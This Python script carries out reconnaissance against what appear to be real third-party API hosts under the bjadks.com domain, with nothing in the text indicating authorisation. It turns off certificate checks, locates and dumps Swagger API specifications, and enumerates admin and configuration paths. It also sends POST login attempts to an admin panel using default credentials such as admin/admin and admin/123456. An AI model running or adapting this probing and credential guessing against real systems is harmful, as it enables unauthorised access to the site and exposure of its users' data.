#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Get Swagger API definition and explore admin panel further"""
import sys, urllib.request, urllib.error, ssl, json, re

def p(s=""): print(s); sys.stdout.flush()

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

def fetch(url, timeout=10):
    req = urllib.request.Request(url, headers={
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    })
    with urllib.request.urlopen(req, timeout=timeout, context=ctx) as r:
        return r.status, r.read().decode("utf-8", "replace")

# 1. Parse Swagger UI HTML to find the actual spec URL
p("[1] Parsing Swagger UI to find spec URL:")
try:
    st, body = fetch("https://base2.api.bjadks.com/swagger/index.html")
    # Look for urls in the Swagger UI HTML/JS
    urls = re.findall(r'["\']([^"\']*(?:swagger|api|json|yaml|spec)[^"\']*)["\']', body, re.I)
    p("  URLs found in Swagger HTML:")
    seen = set()
    for u in urls:
        if u not in seen and len(u) > 5:
            p("    %s" % u)
            seen.add(u)
    # Also look for configUrl or url parameter
    configs = re.findall(r'(?:configUrl|url|spec)\s*[:=]\s*["\']([^"\']+)["\']', body)
    if configs:
        p("  Config URLs:")
        for c in configs:
            p("    %s" % c)
except Exception as e:
    p("  Error: %s" % e)

# 2. Try common Swagger spec locations
p("\n[2] Probing Swagger spec locations:")
spec_urls = [
    "https://base2.api.bjadks.com/swagger/v1/swagger.json",
    "https://base2.api.bjadks.com/swagger/v2/swagger.json",
    "https://base2.api.bjadks.com/swagger/swagger.json",
    "https://base2.api.bjadks.com/v1/swagger.json",
    "https://base2.api.bjadks.com/v2/swagger.json",
    "https://base2.api.bjadks.com/swagger.json",
    "https://base2.api.bjadks.com/api/swagger.json",
    "https://base2.api.bjadks.com/Api/swagger.json",
    "https://base2.api.bjadks.com/Api/v1/swagger.json",
]
for url in spec_urls:
    try:
        st, body = fetch(url, timeout=5)
        is_json = body.strip().startswith("{")
        p("  %-55s HTTP %d len=%-6d %s" % (url, st, len(body), "JSON!" if is_json else ""))
        if is_json:
            try:
                data = json.loads(body)
                p("    Keys: %s" % list(data.keys())[:10])
                if "paths" in data:
                    paths = list(data["paths"].keys())
                    p("    Paths (%d):" % len(paths))
                    for path in paths[:40]:
                        methods = list(data["paths"][path].keys())
                        p("      %-45s %s" % (path, methods))
            except:
                pass
    except Exception as e:
        pass

# 3. Explore admin panel login endpoint
p("\n[3] Admin panel login endpoint analysis:")
try:
    # Try login with empty/common creds to see response format
    login_url = "https://wxmini.api.bjadks.com/Home/Login"
    test_creds = [
        {"userName": "admin", "password": "admin"},
        {"userName": "admin", "password": "123456"},
        {"userName": "test", "password": "test"},
    ]
    for creds in test_creds:
        data = urllib.parse.urlencode(creds).encode("utf-8")
        req = urllib.request.Request(login_url, data=data, headers={
            "User-Agent": "Mozilla/5.0",
            "Content-Type": "application/x-www-form-urlencoded",
            "X-Requested-With": "XMLHttpRequest",
        }, method="POST")
        try:
            with urllib.request.urlopen(req, timeout=8, context=ctx) as r:
                body = r.read().decode("utf-8", "replace")
                p("  %-20s -> HTTP %d: %s" % ("%s/%s" % (creds["userName"], creds["password"]), r.status, body[:200]))
        except urllib.error.HTTPError as e:
            body = e.read().decode("utf-8", "replace")
            p("  %-20s -> HTTP %d: %s" % ("%s/%s" % (creds["userName"], creds["password"]), e.code, body[:200]))
        except Exception as e:
            p("  %-20s -> Error: %s" % ("%s/%s" % (creds["userName"], creds["password"]), str(e)[:100]))
except Exception as e:
    p("  Error: %s" % e)

# 4. Check wxmini.api for more paths
p("\n[4] More paths on wxmini.api.bjadks.com:")
paths = [
    "/Home", "/Home/Index", "/Home/Login",
    "/Account", "/Account/Login",
    "/Activity", "/Activity/Index",
    "/Customer", "/Customer/Index",
    "/User", "/User/Index",
    "/Config", "/Config/Index",
    "/ActApi", "/BaseApi",
    "/css/public.css", "/lib/jquery/dist/jquery.js",
]
for path in paths:
    try:
        st, body = fetch("https://wxmini.api.bjadks.com" + path, timeout=5)
        title = ""
        if "<title>" in body.lower():
            idx = body.lower().index("<title>")
            end = body.lower().index("</title>", idx)
            title = body[idx+7:end].strip()
        p("  %-35s HTTP %d len=%-6d title=%s" % (path, st, len(body), title))
    except urllib.error.HTTPError as e:
        p("  %-35s HTTP %d" % (path, e.code))
    except:
        pass

import urllib.parse

p("\n" + "=" * 70)
